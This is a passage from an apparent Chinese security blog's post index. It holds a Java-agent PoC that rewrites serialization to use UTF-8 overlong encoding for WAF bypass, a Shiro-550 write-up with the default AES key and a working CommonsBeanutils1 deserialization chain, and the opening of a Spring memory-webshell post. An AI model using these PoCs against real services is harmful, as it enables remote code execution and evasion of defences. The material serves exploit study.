attach.loadAgent(\u0026#34;C:\\\\Users\\\\jie\\\\Desktop\\\\Java\\\\Learn\\\\out\\\\artifacts\\\\agent_jar\\\\agent.jar\u0026#34;); attach.detach(); System.out.println(\u0026#34;attach ok\u0026#34;); // List\u0026lt;VirtualMachineDescriptor\u0026gt; list = VirtualMachine.list(); // 得到 JVM 进程列表 // for (VirtualMachineDescriptor desc : list){ // 遍历 // String name = desc.displayName(); // 进程名 // String pid = desc.id(); // PID // // if (name.contains(\u0026#34;test\u0026#34;)){ // System.out.println(pid); // VirtualMachine vm = VirtualMachine.attach(pid); // vm.loadAgent(\u0026#34;C:\\\\Users\\\\jie\\\\Desktop\\\\Java\\\\Learn\\\\out\\\\artifacts\\\\agent_jar\\\\agent.jar\u0026#34;); // vm.detach(); // System.out.println(\u0026#34;attach ok\u0026#34;); // break; // } // } } } 然后运行agent_test进行attach，成功执行agentmain()中的代码\n实战 我们学完agent怎么修改class后解决这个问题轻而易举！\n我这里是用premain，然后通过javaagent来加载我们生成的jar包，这里直接上我最后的poc吧\nJieTransformer\npackage com.jie; import javassist.*; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; import java.io.IOException; public class JieTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { try { //拦截即将被加载或重加载的class if(className.equals(\u0026#34;java/io/ObjectOutputStream$BlockDataOutputStream\u0026#34;)) { System.out.println(\u0026#34;111111111111111\u0026#34;); ClassPool cp = ClassPool.getDefault(); cp.importPackage(IOException.class.getName()); // if (classBeingRedefined != null) { // ClassClassPath ccp = new ClassClassPath(classBeingRedefined); // cp.insertClassPath(ccp); // } CtClass ctc = cp.get(\u0026#34;java.io.ObjectOutputStream$BlockDataOutputStream\u0026#34;); CtMethod method1 = ctc.getDeclaredMethod(\u0026#34;getUTFLength\u0026#34;, new CtClass[]{cp.get(\u0026#34;java.lang.String\u0026#34;)}); ctc.removeMethod(method1); CtMethod make1=CtNewMethod.make(\u0026#34;long getUTFLength(String s) {\\n\u0026#34; + \u0026#34; int len = s.length();\\n\u0026#34; + \u0026#34; long utflen = 0;\\n\u0026#34; + \u0026#34; for (int off = 0; off \u0026lt; len; ) {\\n\u0026#34; + \u0026#34; int csize = Math.min(len - off, CHAR_BUF_SIZE);\\n\u0026#34; + \u0026#34; s.getChars(off, off + csize, cbuf, 0);\\n\u0026#34; + \u0026#34; for (int cpos = 0; cpos \u0026lt; csize; cpos++) {\\n\u0026#34; + \u0026#34; char c = cbuf[cpos];\\n\u0026#34; + // \u0026#34; if (c \u0026gt;= 0x0001 \u0026amp;\u0026amp; c \u0026lt;= 0x0020) {\\n\u0026#34; + // \u0026#34; utflen++;\\n\u0026#34; + // \u0026#34; } else if (c \u0026gt; 0x07FF) {\\n\u0026#34; + // \u0026#34; utflen += 3;\\n\u0026#34; + // \u0026#34; } else {\\n\u0026#34; + \u0026#34; utflen += 2;\\n\u0026#34; + // \u0026#34; }\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; off += csize;\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; return utflen;\\n\u0026#34; + \u0026#34; }\u0026#34;,ctc); CtMethod method2 = ctc.getDeclaredMethod(\u0026#34;writeUTFBody\u0026#34;, new CtClass[]{cp.get(\u0026#34;java.lang.String\u0026#34;)}); ctc.removeMethod(method2); CtMethod make2=CtMethod.make(\u0026#34;private void writeUTFBody(String s) {\\n\u0026#34; + \u0026#34; int limit = MAX_BLOCK_SIZE - 3;\\n\u0026#34; + \u0026#34; int len = s.length();\\n\u0026#34; + \u0026#34; for (int off = 0; off \u0026lt; len; ) {\\n\u0026#34; + \u0026#34; int csize = Math.min(len - off, CHAR_BUF_SIZE);\\n\u0026#34; + \u0026#34; s.getChars(off, off + csize, cbuf, 0);\\n\u0026#34; + \u0026#34; for (int cpos = 0; cpos \u0026lt; csize; cpos++) {\\n\u0026#34; + \u0026#34; char c = cbuf[cpos];\\n\u0026#34; + \u0026#34; if (pos \u0026lt;= limit) {\\n\u0026#34; + // \u0026#34; if (c \u0026lt;= 0x0020 \u0026amp;\u0026amp; c != 0) {\\n\u0026#34; + // \u0026#34; buf[pos++] = (byte) c;\\n\u0026#34; + // \u0026#34; } else if (c \u0026gt; 0x07FF) {\\n\u0026#34; + // \u0026#34; buf[pos + 2] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F));\\n\u0026#34; + // \u0026#34; buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F));\\n\u0026#34; + // \u0026#34; buf[pos + 0] = (byte) (0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F));\\n\u0026#34; + // \u0026#34; pos += 3;\\n\u0026#34; + // \u0026#34; } else {\\n\u0026#34; + \u0026#34; buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F));\\n\u0026#34; + \u0026#34; buf[pos + 0] = (byte) (0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F));\\n\u0026#34; + \u0026#34; pos += 2;\\n\u0026#34; + // \u0026#34; }\\n\u0026#34; + \u0026#34; } else { // write one byte at a time to normalize block\\n\u0026#34; + // \u0026#34; if (c \u0026lt;= 0x0020 \u0026amp;\u0026amp; c != 0) {\\n\u0026#34; + // \u0026#34; write(c);\\n\u0026#34; + // \u0026#34; } else if (c \u0026gt; 0x07FF) {\\n\u0026#34; + // \u0026#34; write(0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F));\\n\u0026#34; + // \u0026#34; write(0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F));\\n\u0026#34; + // \u0026#34; write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F));\\n\u0026#34; + // \u0026#34; } else {\\n\u0026#34; + \u0026#34; write(0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F));\\n\u0026#34; + \u0026#34; write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F));\\n\u0026#34; + // \u0026#34; }\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; off += csize;\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; }\u0026#34;,ctc); ctc.addMethod(make1); ctc.addMethod(make2); byte[] bytes = ctc.toBytecode(); ctc.detach(); System.out.println(\u0026#34;maked\u0026#34;); return bytes; } } catch (Exception e){ e.printStackTrace(); } return null; } } Demo\npackage com.jie; import com.n1ght.NightTransformer; import java.io.ObjectOutputStream; import java.lang.instrument.Instrumentation; import java.lang.reflect.AccessibleObject; public class Demo { public static void premain(String args, Instrumentation inst) throws Exception { inst.addTransformer(new JieTransformer(), true); //生成transform() inst.retransformClasses(new Class[] { Object.class }); //这里只是用来触发生成transform() // 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class } } MANIFEST.MF\nManifest-Version: 1.0 Can-Redefine-Classes: true Can-Retransform-Classes: true Premain-Class: com.jie.Demo 然后将这个模块生成jar包，在CC6执行添加这个-javaagent:jarpath\n看看效果图吧，属性的问题都解决了\n","permalink":"https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"0x01 前言 Java反序列化中应用 @1ue UTF-8 Overlong Encoding原理 @p牛 拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-","title":"UTF-8 Overlong Encoding-Java反序列化"},{"content":"shrio 550 前言：对PropertyUtils.getProperty()中的一些流程进行调试，分析出descriptors中值怎么来，为什么是这些值，从而明白poc中这段代码为什么这么设置BeanComparator beanComparator = new BeanComparator(\u0026quot;outputProperties\u0026quot;);\n其他没什么新思考了，本文主要是分析CommonsBeanutils链的\n代码环境\nhttps://github.com/phith0n/JavaThings/tree/master/shirodemo\n看这条链子主要是惦记着shrio，这里大概记录下shrio的流程吧，也不复杂，就不单独拿出来讲了\nCookieRememberMeManager#getRememberedSerializedIdentity\n这里会获取我们rememberMe的值进行base64解码返回\nAbstractRememberMeManager#convertBytesToPrincipals()\n这里会对base64解密后bytes再进行一次AES解密，解密后再进行我们反序列化操作（这也是为什么我们需要密钥，就是这里用来AES解密的）\ndecrypt()\n可以看到是CBC PKCS5Padding这种模式，AES 128位 的加密\n密钥在这个类上面就能看到\nprivate static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); deserialize()\n注意这里shiro中ClassResolvingObjectInputStream重写了ObjectInputStream里的resolveClass方法，这里非 Java 原生的数组会反序列化失败\n这就导致只要 cc 链包含了 Transformer 数组, 都会利用失败\n参考文章 (写的很详细): https://blog.zsxsoft.com/post/35\nShiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。\n@Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException { try { return ClassUtils.forName(osc.getName()); } catch (UnknownClassException e) { throw new ClassNotFoundException(\u0026#34;Unable to load ObjectStreamClass [\u0026#34; + osc + \u0026#34;]: \u0026#34;, e); } } 这里ClassUtils.forName寻找类的方式跟ObjectInputStream的不一样\n下面这个数组类型最后会到URLClassLoader#findClass()=\u0026gt;getResource()\n[Lorg.apache.commons.collections.Transformer; 这里外层是一个for循环，把每个Appcalssload会查找类的路径，在getResource()和要查找的Class进行包含判断，\n这里我们Class包含metaIndex，才会进行后面的代码，没有就返回false\n正常类是没有问题的，但是数组类型的类话路径上开头是[L，怎么会有对应的路径能查找到呢，所以报错\nfor (int i = 0; (loader = getLoader(i)) != null; i++) { Resource res = loader.getResource(name, check); if (res != null) { return res; } } 所以这里CC需要改造成无数组的poc，我这里就不记录，也是用的前面CC的方法整合的，感兴趣可以看下面参考的连接\nCommonsBeanutils1 CommonsBeanutils1是用来解决shiro无CC依赖的问题，shiro自带CommonsBeanutils依赖，所以这链子有可以叫shiro无依赖链\n环境\npom.xml 有点杂，反正这个能打\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.govuln\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;shiroattack\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;name\u0026gt;shiroattack\u0026lt;/name\u0026gt; \u0026lt;!-- FIXME change it to the project\u0026#39;s website --\u0026gt; \u0026lt;url\u0026gt;http://www.example.com\u0026lt;/url\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;maven.compiler.source\u0026gt;1.8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;1.8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.shiro\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;shiro-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.27.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.shiro\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;shiro-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.shiro\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;shiro-web\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.4\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javax.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet.jsp\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jsp-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.slf4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;slf4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.30\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.slf4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;slf4j-simple\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.30\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;pluginManagement\u0026gt;\u0026lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-clean-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-resources-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.2\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.8.0\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.22.1\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-jar-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.2\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-install-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.2\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-deploy-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.2\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-site-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.7.1\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-project-info-reports-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0\u0026lt;/version\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/pluginManagement\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;source\u0026gt;8\u0026lt;/source\u0026gt; \u0026lt;target\u0026gt;8\u0026lt;/target\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; 漏洞起源于 PropertyUtils, 其 getProperty 方法能够调用任意类的 getter\nPropertyUtils.getProperty(person, \u0026#34;name\u0026#34;); // person.getName(); org.apache.commons.beanutils.BeanComparator 的 compare 方法会通过 getProperty 分别调用两个对象的 getter\n这里就联想到CC2的开头，CC2开头那个类是jdk原生的所以可以直接用，链子就完整了，调试也很简单，自己改改就好了\n利用链 Gadget chain: PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() BeanComparator.compare() PropertyUtils.getProperty() TemplatesImpl.getoutputProperties() poc package com.govuln.shiroattack; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class mycode { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(com.govuln.shiroattack.Evil.class.getName()); byte[] bytecode = clazz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{bytecode}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //BeanComparator beanComparator = new BeanComparator(\u0026#34;outputProperties\u0026#34;); BeanComparator beanComparator = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator); priorityQueue.add(obj); // priorityQueue.add(1); Field size = priorityQueue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); size.setAccessible(true); size.setInt(priorityQueue, 2); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(priorityQueue); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 链子很简单没啥分析，但是PropertyUtils.getProperty()里面有很多步骤，这里主要分析下getPropertyDescriptors()这个东西\ngetTargetPropertyInfo() PropertyUtils.getProperty()中会一直到getSimpleProperty()这里\n第一步根据bean和name获取descriptor 获取descriptor对应的Method invoke执行这个Method 最主要的一步就是getPropertyDescriptor(),我们跟进去，主要就下面的代码\nPropertyDescriptor[] descriptors = getPropertyDescriptors(bean); if (descriptors != null) { for (int i = 0; i \u0026lt; descriptors.length; i++) { if (name.equals(descriptors[i].getName())) { return (descriptors[i]); } } } 根据bean(TemplatesImpl)通过getPropertyDescriptors，得到descriptors，然后for根据我们传入的name，返回对应的descriptor。\n我当时就好奇为什么TemplatesImpl只返回这几个值，为什么有getoutputProperties，一切道理都在getPropertyDescriptors中，我们跟进\n到Introspector.getBeanInfo，后面的调试会很乱，会去找父类的getBeanInfo方法直到null（object）//这里看不懂也没关系，大概知道干了啥\n我们主要注意的是TemplatesImpl的getBeanInfo()，以及getTargetPropertyInfo()因为他其实就是获取Properties的，也就是上面descriptors的核心值\n【*】好戏开场 Properties由来 在java/beans/Introspector.java#getTargetPropertyInfo()中\n我们直接看到Method获取这里，会获取beanClass(TemplatesImpl)的所有Public Method，然后通过下面这个for进行添加，这个for就是核心代码\n可以看到不能是static方法，不能Method长度\u0026lt;=3也不行（除非is开头方法）\nString name = method.getName(); Class\u0026lt;?\u0026gt;[] argTypes = method.getParameterTypes(); Class\u0026lt;?\u0026gt; resultType = method.getReturnType(); int argCount = argTypes.length; PropertyDescriptor pd = null; 这一段进行一些初始化\n然后下面这段if，满足条件的会给pd进行赋值，比如getoutputProperties\n第一个if (没有参数)\n第二个if（get开头）\n满足！给pd赋值，这里注意传参的值，name会去掉前三位，所以后面name是outputProperties\nsetter，getter都是去除前3位，is是2位\n进行这些判断后，pd有值的会add到Properties（并不是代码中这个值，这个名字作为一个理解的代表）\n到这里其实就明白Properties是怎么来的了，为什么是这些值，其实在jackson那个地方获取到getter方法Properties应该是异曲同工（那时我好像没细看，今天刚好来兴致了）\n总结 Properties 后面又遇到这个问题了，写了个demo测了，然后做个总结\n首先都要是public 方法\n其次会递归通过下面这种方式查找父类符合的方法\nlen\u0026gt;3 or is开头(也就是get()这种不行，is()可以)\nis\nis开头 无参 \u0026amp; 返回(**boolean**类型)值 getter型\nget开头 无参 or 1个(**int**类型)参数 setter\nset开头\n1个参数 \u0026amp; 无返回值（void）\nor\n2个参数 \u0026amp; 无返回值（void）\u0026amp; 第一个参数为（**int**类型)\nimport org.apache.commons.beanutils.PropertyUtilsBean; import java.beans.BeanInfo; import java.beans.IntrospectionException; import java.beans.Introspector; import java.beans.PropertyDescriptor; public class getter extends PropertyUtilsBean { public synchronized String isIS() { return \u0026#34;_bytecodes\u0026#34;; } public boolean isboolean() { return true; } public boolean is() { return true; } public synchronized String get0param() { return \u0026#34;_bytecodes\u0026#34;; } public synchronized String get() { return \u0026#34;_bytecodes\u0026#34;; } public synchronized String getStr(String name) { return name; } public synchronized int getint(int name) { return name; } public synchronized int sethas(int name) { return name; } public synchronized void setvoid(int name) { ; } public synchronized void set2voidint1(int one,String name) { ; } public synchronized void set2voidint2(String name,int two) { ; } public synchronized int set2voidint2(int name,int two) { return two; } public static void main(String[] args) throws IntrospectionException { BeanInfo beanInfo = Introspector.getBeanInfo(getter.class); // 假设你的类名是Getter PropertyDescriptor[] descriptors = beanInfo.getPropertyDescriptors(); // 遍历并打印每个属性描述符 for (PropertyDescriptor pd : descriptors) { System.out.println(pd); } } } shiro 721 这里简单提一嘴吧，原理是跟密码学相关的，看了理解也不是很好做个记录\n经过shiro550后，shiro密钥变成随机的了，但是可以利用**Padding Oracle Attack攻击**（加密算法的缺陷）在不知道密钥的情况下构造出恶意密文进行攻击，但是有一个条件需要一个合法的Cookie，这个Cookie是用来爆破的。\n这里总结很简陋！_!可以看看参考都是不错的文章\n参考\nshiro550\nhttps://exp10it.io/2022/12/shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90\nshiro721\n复现shiro721\nhttps://www.anquanke.com/post/id/193165#h3-10\nhttps://xz.aliyun.com/t/11633?time__1311=Cq0xRQiQwxgDlxGg6Du7YDkYG8BmhYt3x\n","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/","summary":"shrio 550 前言：对PropertyUtils.getProperty()中的一些流程进行调试，分析出descriptors中值怎么来，为什么是这些","title":"CommonsBeanutils\u0026shiro550"},{"content":" 前言: 不建议看Controller内存马，因为前面完全是笔者自己在摸索，后面还错了hh（太菜啦）。跟我这个走的话可能会费力不讨好。\nInterceptor内存马可以看，有前面的基础，很简单就构造出来了\n0x01 环境 这里我们要创建jdk1.8的spring，新版idea需要跟换下成阿里的链接具体可以参考低版本jdk spring\n这里选择springboot版本，和spring web\n2.6之后的版本复现不成功，内存马可以正常注入，但是访问时报错\njava.lang.IllegalArgumentException: Expected lookupPath in request attribute \u0026#34;org.springframework.web.util.UrlPathHelper.PATH\u0026#34;. 查了一下发现在springboot 2.6.0之后不能有自定义注册RequestMapping的逻辑，应该也是为了防御内存马，除了添加配置目前没有找到比较好的解决方法\nhttps://liuyanzhao.com/1503010911382802434.html\nhttps://blog.csdn.net/maple_son/article/details/122572869\n然后就可以直接写controller了\npom.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springboot1\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;name\u0026gt;springboot1\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;springboot1\u0026lt;/description\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;java.version\u0026gt;1.8\u0026lt;/java.version\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;project.reporting.outputEncoding\u0026gt;UTF-8\u0026lt;/project.reporting.outputEncoding\u0026gt; \u0026lt;spring-boot.version\u0026gt;2.6.13\u0026lt;/spring-boot.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; 